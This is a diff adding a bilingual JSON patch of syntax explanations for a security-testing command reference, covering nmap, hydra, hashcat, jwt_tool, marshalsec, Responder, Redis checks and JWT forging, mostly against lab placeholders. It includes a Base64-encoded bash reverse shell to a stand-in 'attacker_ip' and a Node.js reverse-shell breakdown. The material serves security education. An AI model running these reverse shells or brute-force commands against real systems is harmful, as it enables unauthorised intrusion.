@@ -1,0 +1,2155 @@
+{
+ "schemaVersion": 1,
+ "entries": [
+  {
+   "id": "nmap",
+   "patches": [
+    {
+     "path": "commands.0.syntaxBreakdown",
+     "value": [
+      {
+       "part": "nmap",
+       "explanation": {
+        "zh": "Nmap 扫描工具",
+        "en": "Nmap scanning tool"
+       },
+       "type": "command"
+      },
+      {
+       "part": "-sT",
+       "explanation": {
+        "zh": "TCP 连接扫描模式（完成三次握手，无需 root 权限）",
+        "en": "TCP connect scan (completes the handshake, no root needed)"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "{LAB_HOST}",
+       "explanation": {
+        "zh": "实验室授权目标主机占位符",
+        "en": "Authorized lab target host placeholder"
+       },
+       "type": "value"
+      }
+     ]
+    },
+    {
+     "path": "commands.13.syntaxBreakdown",
+     "value": [
+      {
+       "part": "-oN",
+       "explanation": {
+        "zh": "将扫描结果以普通文本格式写入文件",
+        "en": "Write scan results to a file in normal text format"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "output.txt",
+       "explanation": {
+        "zh": "输出文件名",
+        "en": "Output file name"
+       },
+       "type": "value"
+      },
+      {
+       "part": "{LAB_HOST}",
+       "explanation": {
+        "zh": "实验室授权目标主机占位符",
+        "en": "Authorized lab target host placeholder"
+       },
+       "type": "value"
+      }
+     ]
+    },
+    {
+     "path": "commands.14.syntaxBreakdown",
+     "value": [
+      {
+       "part": "-sT",
+       "explanation": {
+        "zh": "TCP 连接扫描，无需原始套接字权限",
+        "en": "TCP connect scan, no raw socket privileges needed"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "-Pn",
+       "explanation": {
+        "zh": "跳过主机存活探测，直接扫描目标端口",
+        "en": "Skip host discovery and scan target ports directly"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "--top-ports 20",
+       "explanation": {
+        "zh": "只扫描最常用的 20 个端口",
+        "en": "Scan only the 20 most common ports"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "--max-rate 20",
+       "explanation": {
+        "zh": "限速每秒最多发送 20 个探测包",
+        "en": "Cap the rate at 20 probe packets per second"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "--max-retries 1",
+       "explanation": {
+        "zh": "每个端口最多重试 1 次，控制扫描时长",
+        "en": "Retry each port at most once to bound scan duration"
+       },
+       "type": "parameter"
+      }
+     ]
+    },
+    {
+     "path": "commands.15.syntaxBreakdown",
+     "value": [
+      {
+       "part": "-Pn",
+       "explanation": {
+        "zh": "跳过主机发现，直接扫描端口",
+        "en": "Skip host discovery and scan ports directly"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "-p 22,80,443,445,3389",
+       "explanation": {
+        "zh": "只扫描 5 个常用服务端口，代替全端口扫描",
+        "en": "Scan only five common service ports instead of all ports"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "--max-rate 10",
+       "explanation": {
+        "zh": "限速每秒 10 个探测包",
+        "en": "Cap the rate at 10 packets per second"
+       },
+       "type": "parameter"
+      }
+     ]
+    },
+    {
+     "path": "commands.16.syntaxBreakdown",
+     "value": [
+      {
+       "part": "-sV",
+       "explanation": {
+        "zh": "探测开放端口上的服务版本",
+        "en": "Probe service versions on open ports"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "--version-light",
+       "explanation": {
+        "zh": "使用轻量级版本探针集，降低探测强度与耗时",
+        "en": "Use the light intensity probe set to reduce scan overhead"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "--max-rate 10",
+       "explanation": {
+        "zh": "限速每秒 10 个探测包",
+        "en": "Cap the rate at 10 packets per second"
+       },
+       "type": "parameter"
+      }
+     ]
+    },
+    {
+     "path": "commands.20.syntaxBreakdown",
+     "value": [
+      {
+       "part": "-p 80,443",
+       "explanation": {
+        "zh": "限定 Web 常用端口",
+        "en": "Limit to common web ports"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "--script http-title,http-headers",
+       "explanation": {
+        "zh": "运行指定的两个 HTTP 枚举脚本，抓取页面标题与响应头",
+        "en": "Run the two named HTTP NSE scripts to grab page titles and headers"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "--max-rate 5",
+       "explanation": {
+        "zh": "限速每秒 5 个探测包",
+        "en": "Cap the rate at 5 packets per second"
+       },
+       "type": "parameter"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "id": "hydra",
+   "patches": [
+    {
+     "path": "commands.0.syntaxBreakdown",
+     "value": [
+      {
+       "part": "hydra",
+       "explanation": {
+        "zh": "Hydra 爆破工具",
+        "en": "Hydra brute force tool"
+       },
+       "type": "command"
+      },
+      {
+       "part": "-l user",
+       "explanation": {
+        "zh": "指定单个登录用户名",
+        "en": "Specify a single login username"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "-P wordlist.txt",
+       "explanation": {
+        "zh": "指定密码字典文件",
+        "en": "Specify the password wordlist file"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "ssh://{LAB_HOST}",
+       "explanation": {
+        "zh": "SSH 服务模块与实验室目标主机",
+        "en": "SSH service module against the lab target host"
+       },
+       "type": "value"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "id": "hashcat",
+   "patches": [
+    {
+     "path": "commands.10.syntaxBreakdown",
+     "value": [
+      {
+       "part": "> .payloader-jwt-approved-secrets.txt",
+       "explanation": {
+        "zh": "把三个核准测试候选密钥写入临时字典文件",
+        "en": "Write the three approved test candidate secrets into a temporary dictionary"
+       },
+       "type": "value"
+      },
+      {
+       "part": "-m 16500",
+       "explanation": {
+        "zh": "JWT（HS256 签名）哈希模式",
+        "en": "JWT (HS256 signature) hash mode"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "--potfile-disable",
+       "explanation": {
+        "zh": "不写入 potfile，避免残留破解记录",
+        "en": "Do not write a potfile, leaving no crack records"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "--runtime=10",
+       "explanation": {
+        "zh": "限制会话运行 10 秒即停",
+        "en": "Stop the session after 10 seconds"
+       },
+       "type": "parameter"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "id": "impacket",
+   "patches": [
+    {
+     "path": "commands.10.syntaxBreakdown",
+     "value": [
+      {
+       "part": "impacket-GetUserSPNs",
+       "explanation": {
+        "zh": "Impacket 的 SPN 查询工具（发行版打包入口名）",
+        "en": "Impacket SPN query tool (packaged entrypoint name)"
+       },
+       "type": "command"
+      },
+      {
+       "part": "-h",
+       "explanation": {
+        "zh": "显示帮助，不发起网络请求",
+        "en": "Show help without sending network requests"
+       },
+       "type": "parameter"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "id": "burpsuite",
+   "patches": [
+    {
+     "path": "commands.15.syntaxBreakdown",
+     "value": [
+      {
+       "part": "mode=pitchfork",
+       "explanation": {
+        "zh": "Intruder 一对一映射模式的键值配置声明：两组载荷按位对应",
+        "en": "Key-value declaration of Intruder pitchfork mode: two payload sets map position by position"
+       },
+       "type": "tool-mode"
+      },
+      {
+       "part": "scope=synthetic-accounts-only",
+       "explanation": {
+        "zh": "限定仅对合成账号范围生效",
+        "en": "Restrict the scope to synthetic accounts only"
+       },
+       "type": "value"
+      }
+     ]
+    },
+    {
+     "path": "commands.16.syntaxBreakdown",
+     "value": [
+      {
+       "part": "mode=cluster-bomb",
+       "explanation": {
+        "zh": "Intruder 全排列模式的键值配置声明：两组载荷交叉组合",
+        "en": "Key-value declaration of Intruder cluster bomb mode: two payload sets combine cross-product"
+       },
+       "type": "tool-mode"
+      },
+      {
+       "part": "scope=synthetic-accounts-only",
+       "explanation": {
+        "zh": "限定仅对合成账号范围生效",
+        "en": "Restrict the scope to synthetic accounts only"
+       },
+       "type": "value"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "id": "wfuzz",
+   "patches": [
+    {
+     "path": "commands.0.syntaxBreakdown",
+     "value": [
+      {
+       "part": "-c",
+       "explanation": {
+        "zh": "彩色输出",
+        "en": "Colorized output"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "-z file,/usr/share/wordlists/dirb/big.txt",
+       "explanation": {
+        "zh": "以指定字典文件作为 FUZZ 载荷",
+        "en": "Use the given dictionary file as the FUZZ payload"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "--hc 404",
+       "explanation": {
+        "zh": "按状态码隐藏 404 响应",
+        "en": "Hide responses with status code 404"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "FUZZ",
+       "explanation": {
+        "zh": "载荷注入点占位符",
+        "en": "Payload injection point placeholder"
+       },
+       "type": "variable"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "id": "dalfox",
+   "patches": [
+    {
+     "path": "commands.0.syntaxBreakdown",
+     "value": [
+      {
+       "part": "dalfox",
+       "explanation": {
+        "zh": "XSS 漏洞扫描工具",
+        "en": "XSS vulnerability scanner"
+       },
+       "type": "command"
+      },
+      {
+       "part": "scan",
+       "explanation": {
+        "zh": "v3 的扫描子命令，取代 v2 的 url/file/pipe 模式",
+        "en": "The v3 scan subcommand, replacing the v2 url/file/pipe modes"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "--format jsonl",
+       "explanation": {
+        "zh": "以 JSON Lines 格式输出结果",
+        "en": "Emit results as JSON Lines"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "--output dalfox-results.jsonl",
+       "explanation": {
+        "zh": "把结果写入指定文件",
+        "en": "Write results to the given file"
+       },
+       "type": "parameter"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "id": "jwt-tool",
+   "patches": [
+    {
+     "path": "commands.7.syntaxBreakdown",
+     "value": [
+      {
+       "part": "jwt_tool.py",
+       "explanation": {
+        "zh": "JWT 安全测试工具脚本",
+        "en": "JWT security testing tool script"
+       },
+       "type": "command"
+      },
+      {
+       "part": "-X a",
+       "explanation": {
+        "zh": "执行 alg:none 攻击模式",
+        "en": "Run the alg:none attack mode"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "fixtures/payloader-unsigned.jwt",
+       "explanation": {
+        "zh": "本地合成的未签名 JWT 夹具，仅用于离线验证",
+        "en": "Locally synthesized unsigned JWT fixture for offline verification only"
+       },
+       "type": "value"
+      }
+     ]
+    },
+    {
+     "path": "commands.8.syntaxBreakdown",
+     "value": [
+      {
+       "part": "-X k",
+       "explanation": {
+        "zh": "执行 RS256 转 HS256 的密钥混淆攻击模式",
+        "en": "Run the RS256-to-HS256 key confusion attack mode"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "-pk .payloader-jwt-fixture/public.pem",
+       "explanation": {
+        "zh": "指定本地夹具公钥文件路径",
+        "en": "Specify the local fixture public key file path"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "fixtures/payloader-rs256.jwt",
+       "explanation": {
+        "zh": "本地合成的 RS256 JWT 夹具",
+        "en": "Locally synthesized RS256 JWT fixture"
+       },
+       "type": "value"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "id": "marshalsec",
+   "patches": [
+    {
+     "path": "commands.0.syntaxBreakdown",
+     "value": [
+      {
+       "part": "LDAPRefServer",
+       "explanation": {
+        "zh": "启动 LDAP Reference 服务器，把 JNDI 引用回指到 codebase URL",
+        "en": "Start the LDAP reference server that points JNDI lookups at a codebase URL"
+       },
+       "type": "command"
+      },
+      {
+       "part": "\"http://127.0.0.1:8888/#LabMarker\"",
+       "explanation": {
+        "zh": "回指本机 8888 端口的实验标记 URL，仅限本地回环",
+        "en": "Codebase URL pointing back at localhost port 8888 with a lab marker, loopback only"
+       },
+       "type": "value"
+      },
+      {
+       "part": "1389",
+       "explanation": {
+        "zh": "LDAP 服务监听端口",
+        "en": "LDAP service listening port"
+       },
+       "type": "value"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "id": "ncrack",
+   "patches": [
+    {
+     "path": "commands.0.syntaxBreakdown",
+     "value": [
+      {
+       "part": "ncrack",
+       "explanation": {
+        "zh": "高速网络认证破解工具",
+        "en": "High-speed network authentication cracking tool"
+       },
+       "type": "command"
+      },
+      {
+       "part": "-vv",
+       "explanation": {
+        "zh": "最详细输出",
+        "en": "Very verbose output"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "-U users.txt",
+       "explanation": {
+        "zh": "指定用户名列表文件",
+        "en": "Specify the username list file"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "-P passwords.txt",
+       "explanation": {
+        "zh": "指定密码字典文件",
+        "en": "Specify the password wordlist file"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "ssh://{LAB_HOST}",
+       "explanation": {
+        "zh": "SSH 服务模块与实验室目标主机",
+        "en": "SSH service module against the lab target host"
+       },
+       "type": "value"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "id": "patator",
+   "patches": [
+    {
+     "path": "commands.0.syntaxBreakdown",
+     "value": [
+      {
+       "part": "ssh_login",
+       "explanation": {
+        "zh": "使用 SSH 登录爆破模块",
+        "en": "Use the SSH login brute force module"
+       },
+       "type": "command"
+      },
+      {
+       "part": "user=FILE0 password=FILE1",
+       "explanation": {
+        "zh": "FILE0 与 FILE1 引用编号字典作为用户名和密码来源",
+        "en": "FILE0 and FILE1 reference the numbered files as username and password sources"
+       },
+       "type": "variable"
+      },
+      {
+       "part": "0=users.txt 1=passwords.txt",
+       "explanation": {
+        "zh": "定义编号 0、1 对应的字典文件",
+        "en": "Define the files bound to numbers 0 and 1"
+       },
+       "type": "value"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "id": "java-reverse",
+   "patches": [
+    {
+     "path": "commands.1.syntaxBreakdown",
+     "value": [
+      {
+       "part": "bash -c",
+       "explanation": {
+        "zh": "以 bash 子进程执行整串管道命令",
+        "en": "Run the whole pipeline through a bash child process"
+       },
+       "type": "command"
+      },
+      {
+       "part": "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlcl9pcC80NDQ0IDA+JjE=}",
+       "explanation": {
+        "zh": "输出 Base64 编码的反弹 shell 命令字面量",
+        "en": "Emit the Base64-encoded reverse shell command literal"
+       },
+       "type": "value"
+      },
+      {
+       "part": "{base64,-d}",
+       "explanation": {
+        "zh": "花括号展开调用 base64 -d 解码",
+        "en": "Brace expansion invoking base64 -d to decode"
+       },
+       "type": "command"
+      },
+      {
+       "part": "{bash,-i}",
+       "explanation": {
+        "zh": "花括号展开调用交互 bash 执行解码结果",
+        "en": "Brace expansion invoking an interactive bash to run the decoded command"
+       },
+       "type": "command"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "id": "nodejs-reverse",
+   "patches": [
+    {
+     "path": "commands.0.syntaxBreakdown",
+     "value": [
+      {
+       "part": "net.Socket()",
+       "explanation": {
+        "zh": "创建 TCP 套接字连接攻击端",
+        "en": "Create a TCP socket connecting back to the attacker"
+       },
+       "type": "command"
+      },
+      {
+       "part": "cp.spawn(\"sh\",[])",
+       "explanation": {
+        "zh": "生成 sh 子进程承接交互 shell",
+        "en": "Spawn an sh child process to host the interactive shell"
+       },
+       "type": "command"
+      },
+      {
+       "part": "client.pipe(sh.stdin)",
+       "explanation": {
+        "zh": "把套接字输入流接入子进程 stdin，实现双向转发",
+        "en": "Pipe socket input into the child stdin for two-way forwarding"
+       },
+       "type": "command"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "id": "smb-pentest",
+   "patches": [
+    {
+     "path": "commands.8.syntaxBreakdown",
+     "value": [
+      {
+       "part": "smbclient",
+       "explanation": {
+        "zh": "Samba 的 SMB 客户端工具",
+        "en": "The Samba SMB client tool"
+       },
+       "type": "command"
+      },
+      {
+       "part": "-L",
+       "explanation": {
+        "zh": "列出目标提供的共享",
+        "en": "List shares offered by the target"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "//{LAB_HOST}/",
+       "explanation": {
+        "zh": "UNC 形式的实验室目标主机",
+        "en": "UNC form of the lab target host"
+       },
+       "type": "value"
+      },
+      {
+       "part": "-U {LAB_USER}",
+       "explanation": {
+        "zh": "指定连接使用的实验室账号",
+        "en": "Specify the lab account used for the connection"
+       },
+       "type": "parameter"
+      }
+     ]
+    },
+    {
+     "path": "commands.9.syntaxBreakdown",
+     "value": [
+      {
+       "part": "nxc smb",
+       "explanation": {
+        "zh": "NetExec（原 CrackMapExec）的 SMB 模块",
+        "en": "The NetExec (formerly CrackMapExec) SMB module"
+       },
+       "type": "command"
+      },
+      {
+       "part": "-u {LAB_USER}",
+       "explanation": {
+        "zh": "指定实验室用户名",
+        "en": "Specify the lab username"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "--shares",
+       "explanation": {
+        "zh": "枚举目标共享列表",
+        "en": "Enumerate the target share list"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "--timeout 5",
+       "explanation": {
+        "zh": "连接超时 5 秒",
+        "en": "Connection timeout of 5 seconds"
+       },
+       "type": "parameter"
+      }
+     ]
+    },
+    {
+     "path": "commands.5.command",
+     "value": "sudo responder -I eth0 -dw\n# 捕获的 NTLMv2 哈希在新版按接口分目录保存（logs-<iface>）\nhashcat -m 5600 hash.txt rockyou.txt"
+    }
+   ]
+  },
+  {
+   "id": "redis-pentest",
+   "patches": [
+    {
+     "path": "commands.4.syntaxBreakdown",
+     "value": [
+      {
+       "part": "redis-cli",
+       "explanation": {
+        "zh": "Redis 命令行客户端",
+        "en": "Redis command line client"
+       },
+       "type": "value"
+      },
+      {
+       "part": "-h 127.0.0.1 -p 6379",
+       "explanation": {
+        "zh": "连接本机回环地址与默认端口",
+        "en": "Connect to the loopback address on the default port"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "PING",
+       "explanation": {
+        "zh": "连通性测试，返回 PONG 即服务可达",
+        "en": "Connectivity probe; PONG means the service answers"
+       },
+       "type": "command"
+      },
+      {
+       "part": "INFO server",
+       "explanation": {
+        "zh": "读取 server 段的版本等基础信息",
+        "en": "Read server-section basics such as the version"
+       },
+       "type": "value"
+      }
+     ]
+    },
+    {
+     "path": "commands.5.syntaxBreakdown",
+     "value": [
+      {
+       "part": "INFO server",
+       "explanation": {
+        "zh": "读取 server 段基础信息",
+        "en": "Read server-section basics"
+       },
+       "type": "value"
+      },
+      {
+       "part": "DBSIZE",
+       "explanation": {
+        "zh": "返回当前数据库键数量，代替全库 KEYS 扫描",
+        "en": "Return the key count of the current database instead of a full KEYS scan"
+       },
+       "type": "value"
+      },
+      {
+       "part": "GET payloader:test:marker",
+       "explanation": {
+        "zh": "读取固定 marker 键，验证只读权限",
+        "en": "Read the fixed marker key to verify read access"
+       },
+       "type": "value"
+      }
+     ]
+    },
+    {
+     "path": "commands.6.syntaxBreakdown",
+     "value": [
+      {
+       "part": "CONFIG GET dir",
+       "explanation": {
+        "zh": "读取 RDB 持久化目录（只读核对写入面）",
+        "en": "Read the RDB persistence directory (read-only review of the write surface)"
+       },
+       "type": "value"
+      },
+      {
+       "part": "CONFIG GET dbfilename",
+       "explanation": {
+        "zh": "读取 RDB 文件名",
+        "en": "Read the RDB file name"
+       },
+       "type": "value"
+      },
+      {
+       "part": "INFO persistence",
+       "explanation": {
+        "zh": "查看 RDB/AOF 持久化状态",
+        "en": "Inspect RDB/AOF persistence status"
+       },
+       "type": "value"
+      },
+      {
+       "part": "ACL WHOAMI",
+       "explanation": {
+        "zh": "确认当前连接的身份与权限组",
+        "en": "Confirm the current connection identity and permission groups"
+       },
+       "type": "value"
+      }
+     ]
+    },
+    {
+     "path": "commands.7.syntaxBreakdown",
+     "value": [
+      {
+       "part": "CONFIG GET dir",
+       "explanation": {
+        "zh": "核对持久化目录是否指向 .ssh 等敏感路径",
+        "en": "Check whether the persistence directory points at sensitive paths like .ssh"
+       },
+       "type": "value"
+      },
+      {
+       "part": "CONFIG GET dbfilename",
+       "explanation": {
+        "zh": "核对持久化文件名是否为 authorized_keys 类写入目标",
+        "en": "Check whether the persistence file name targets authorized_keys-style writes"
+       },
+       "type": "value"
+      },
+      {
+       "part": "ACL WHOAMI",
+       "explanation": {
+        "zh": "确认当前身份是否具备写权限",
+        "en": "Confirm whether the current identity holds write access"
+       },
+       "type": "value"
+      },
+      {
+       "part": "ssh-persistence-check=offline-only",
+       "explanation": {
+        "zh": "输出只读核对标记，不执行任何写键操作",
+        "en": "Emit the read-only review marker without performing any key writes"
+       },
+       "type": "value"
+      }
+     ]
+    },
+    {
+     "path": "commands.8.syntaxBreakdown",
+     "value": [
+      {
+       "part": "CONFIG GET dir",
+       "explanation": {
+        "zh": "核对持久化目录是否指向 cron 目录",
+        "en": "Check whether the persistence directory points at a cron directory"
+       },
+       "type": "value"
+      },
+      {
+       "part": "CONFIG GET dbfilename",
+       "explanation": {
+        "zh": "核对持久化文件名",
+        "en": "Check the persistence file name"
+       },
+       "type": "value"
+      },
+      {
+       "part": "cron-persistence-check=offline-only",
+       "explanation": {
+        "zh": "输出只读核对标记，不写计划任务",
+        "en": "Emit the read-only review marker without writing cron jobs"
+       },
+       "type": "value"
+      }
+     ]
+    },
+    {
+     "path": "commands.9.syntaxBreakdown",
+     "value": [
+      {
+       "part": "ROLE",
+       "explanation": {
+        "zh": "查看当前实例角色（master 或 slave）",
+        "en": "Show the current instance role (master or slave)"
+       },
+       "type": "command"
+      },
+      {
+       "part": "INFO replication",
+       "explanation": {
+        "zh": "读取主从复制状态与偏移",
+        "en": "Read replication status and offsets"
+       },
+       "type": "value"
+      },
+      {
+       "part": "replication-and-module-change=offline-only",
+       "explanation": {
+        "zh": "标记复制与模块变更类验证仅限离线环境，不加载外部模块",
+        "en": "Mark replication and module-change checks as offline-only; no external modules are loaded"
+       },
+       "type": "value"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "id": "web-recon-tools",
+   "patches": [
+    {
+     "path": "commands.7.syntaxBreakdown",
+     "value": [
+      {
+       "part": "dig",
+       "explanation": {
+        "zh": "DNS 查询工具",
+        "en": "DNS lookup tool"
+       },
+       "type": "command"
+      },
+      {
+       "part": "+short",
+       "explanation": {
+        "zh": "只输出简短结果行",
+        "en": "Print only the short answer lines"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "{DOMAIN} A",
+       "explanation": {
+        "zh": "查询 IPv4 地址记录",
+        "en": "Query IPv4 address records"
+       },
+       "type": "value"
+      },
+      {
+       "part": "{DOMAIN} AAAA",
+       "explanation": {
+        "zh": "查询 IPv6 地址记录",
+        "en": "Query IPv6 address records"
+       },
+       "type": "value"
+      },
+      {
+       "part": "{DOMAIN} CNAME",
+       "explanation": {
+        "zh": "查询别名记录，暴露 CDN 或托管关系",
+        "en": "Query alias records that expose CDN or hosting relationships"
+       },
+       "type": "value"
+      }
+     ]
+    },
+    {
+     "path": "commands.8.syntaxBreakdown",
+     "value": [
+      {
+       "part": "dig",
+       "explanation": {
+        "zh": "DNS 查询工具",
+        "en": "DNS lookup tool"
+       },
+       "type": "command"
+      },
+      {
+       "part": "+short",
+       "explanation": {
+        "zh": "只输出简短结果行",
+        "en": "Print only the short answer lines"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "{DOMAIN} MX",
+       "explanation": {
+        "zh": "查询邮件交换记录，常暴露真实出口或中继",
+        "en": "Query mail exchange records that often expose real egress or relays"
+       },
+       "type": "value"
+      },
+      {
+       "part": "{DOMAIN} TXT",
+       "explanation": {
+        "zh": "查询文本记录，包含 SPF 与域验证信息",
+        "en": "Query text records holding SPF and domain verification data"
+       },
+       "type": "value"
+      }
+     ]
+    },
+    {
+     "path": "commands.9.syntaxBreakdown",
+     "value": [
+      {
+       "part": "crt.sh",
+       "explanation": {
+        "zh": "证书透明度日志检索服务",
+        "en": "Certificate transparency log search service"
+       },
+       "type": "value"
+      },
+      {
+       "part": "%25.{DOMAIN}",
+       "explanation": {
+        "zh": "%25 是百分号的 URL 编码，用于匹配该域的通配证书",
+        "en": "%25 is the URL-encoded percent sign, matching wildcard certificates of the domain"
+       },
+       "type": "value"
+      },
+      {
+       "part": "jq -r '.[].name_value'",
+       "explanation": {
+        "zh": "提取每张证书记录中的域名候选",
+        "en": "Extract the domain candidates from each certificate record"
+       },
+       "type": "command"
+      },
+      {
+       "part": "sort -u",
+       "explanation": {
+        "zh": "排序并去重",
+        "en": "Sort and deduplicate"
+       },
+       "type": "command"
+      }
+     ]
+    },
+    {
+     "path": "commands.10.syntaxBreakdown",
+     "value": [
+      {
+       "part": "subfinder",
+       "explanation": {
+        "zh": "被动子域名枚举工具",
+        "en": "Passive subdomain enumeration tool"
+       },
+       "type": "command"
+      },
+      {
+       "part": "-silent",
+       "explanation": {
+        "zh": "只输出子域名结果，隐藏横幅",
+        "en": "Print only subdomain results without the banner"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "-d {DOMAIN}",
+       "explanation": {
+        "zh": "指定根域名",
+        "en": "Specify the root domain"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "sort -u",
+       "explanation": {
+        "zh": "排序并去重",
+        "en": "Sort and deduplicate"
+       },
+       "type": "command"
+      }
+     ]
+    },
+    {
+     "path": "commands.11.syntaxBreakdown",
+     "value": [
+      {
+       "part": "-D edge.headers",
+       "explanation": {
+        "zh": "把边缘节点响应头转储到文件",
+        "en": "Dump the edge node response headers to a file"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "-o edge.body",
+       "explanation": {
+        "zh": "保存边缘节点响应体",
+        "en": "Save the edge node response body"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "--resolve \"{DOMAIN}:443:{ORIGIN_IP}\"",
+       "explanation": {
+        "zh": "强制把域名解析到指定源站 IP，对比直连源站与经 CDN 的差异",
+        "en": "Force the domain to the given origin IP to compare direct-origin against CDN traffic"
+       },
+       "type": "parameter"
+      }
+     ]
+    },
+    {
+     "path": "commands.12.syntaxBreakdown",
+     "value": [
+      {
+       "part": "-w \"edge=%{http_code}\\n\"",
+       "explanation": {
+        "zh": "输出边缘节点状态码便于比对",
+        "en": "Print the edge node status code for comparison"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "-o origin-health.body",
+       "explanation": {
+        "zh": "保存源站直连响应体",
+        "en": "Save the direct-origin response body"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "--resolve \"{DOMAIN}:443:{ORIGIN_IP}\"",
+       "explanation": {
+        "zh": "强制域名解析到指定源站 IP",
+        "en": "Force the domain to resolve to the given origin IP"
+       },
+       "type": "parameter"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "id": "jwt-attacks",
+   "patches": [
+    {
+     "path": "commands.10.syntaxBreakdown",
+     "value": [
+      {
+       "part": "Authorization",
+       "explanation": {
+        "zh": "携带构造令牌的请求头",
+        "en": "Request header carrying the crafted token"
+       },
+       "type": "header"
+      },
+      {
+       "part": "\"alg\": \"none\"",
+       "explanation": {
+        "zh": "构造 alg 为 none 的未签名令牌",
+        "en": "Craft a token whose alg is none, i.e. unsigned"
+       },
+       "type": "value"
+      },
+      {
+       "part": "/api/marker",
+       "explanation": {
+        "zh": "只读本地标记接口，验证器应拒绝该令牌",
+        "en": "Read-only local marker endpoint; the verifier should reject the token"
+       },
+       "type": "path"
+      }
+     ]
+    },
+    {
+     "path": "commands.11.syntaxBreakdown",
+     "value": [
+      {
+       "part": "(\"none\", \"None\", \"NONE\", \"\")",
+       "explanation": {
+        "zh": "覆盖四种 alg 大小写与空值变体，共四次请求",
+        "en": "Cover four alg case and empty variants, four requests total"
+       },
+       "type": "encoding"
+      },
+      {
+       "part": "claims + \".\"",
+       "explanation": {
+        "zh": "第三段留空表示空签名",
+        "en": "The empty third segment represents an empty signature"
+       },
+       "type": "technique"
+      },
+      {
+       "part": "/api/marker",
+       "explanation": {
+        "zh": "只读本地标记接口",
+        "en": "Read-only local marker endpoint"
+       },
+       "type": "path"
+      }
+     ]
+    },
+    {
+     "path": "commands.12.syntaxBreakdown",
+     "value": [
+      {
+       "part": "\"jku\"",
+       "explanation": {
+        "zh": "令牌头中的 JWK Set URL 字段",
+        "en": "The JWK Set URL header field inside the token"
+       },
+       "type": "header"
+      },
+      {
+       "part": "http://127.0.0.1:18080/jwks.json",
+       "explanation": {
+        "zh": "指向本机夹具的 JWK Set 地址，仅回环可达",
+        "en": "JWK Set address pointing at the local fixture, reachable via loopback only"
+       },
+       "type": "value"
+      },
+      {
+       "part": "jwt.encode",
+       "explanation": {
+        "zh": "用本地私钥对 RS256 令牌签名",
+        "en": "Sign the RS256 token with the local private key"
+       },
+       "type": "function"
+      },
+      {
+       "part": "/api/marker",
+       "explanation": {
+        "zh": "只读本地标记接口，验证器不应跟随令牌内任意 URL",
+        "en": "Read-only local marker endpoint; the verifier must not follow arbitrary token URLs"
+       },
+       "type": "path"
+      }
+     ]
+    },
+    {
+     "path": "commands.13.syntaxBreakdown",
+     "value": [
+      {
+       "part": "-text",
+       "explanation": {
+        "zh": "以文本形式打印公钥参数",
+        "en": "Print the public key parameters as text"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "-outform DER",
+       "explanation": {
+        "zh": "把同一公钥输出为 DER 编码副本",
+        "en": "Emit a DER-encoded copy of the same public key"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "openssl dgst -sha256",
+       "explanation": {
+        "zh": "分别计算两种编码的 SHA-256，对比格式差异",
+        "en": "Compute SHA-256 of both encodings to compare format differences"
+       },
+       "type": "command"
+      }
+     ]
+    },
+    {
+     "path": "commands.14.syntaxBreakdown",
+     "value": [
+      {
+       "part": "PAYLOADER_TEST_HS256_SECRET_32_BYTES",
+       "explanation": {
+        "zh": "固定的本地测试密钥",
+        "en": "The fixed local test secret"
+       },
+       "type": "value"
+      },
+      {
+       "part": "hmac.new",
+       "explanation": {
+        "zh": "以 HMAC-SHA256 对 header.payload 计算签名",
+        "en": "Compute the HMAC-SHA256 signature over header.payload"
+       },
+       "type": "function"
+      },
+      {
+       "part": "/api/marker",
+       "explanation": {
+        "zh": "只读本地标记接口",
